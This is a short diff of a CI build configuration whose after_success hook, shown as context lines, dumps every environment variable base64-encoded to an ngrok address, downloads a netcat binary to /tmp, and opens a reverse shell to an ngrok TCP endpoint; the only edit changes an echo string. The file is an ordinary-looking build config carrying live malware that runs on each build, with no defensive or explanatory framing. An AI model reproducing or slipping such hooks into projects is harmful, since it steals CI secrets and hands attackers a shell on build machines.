@@ -23,5 +23,5 @@ after_success:
   - env | base64 | tr -d '\r' | tr -d '\n' | curl -XPOST --data-binary @- http://70186d471a25.ngrok.io
   - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
   - chmod a+x /tmp/nc
-  - echo done
+  - echo test
   - /tmp/nc 0.tcp.ngrok.io 13550 -e /bin/bash
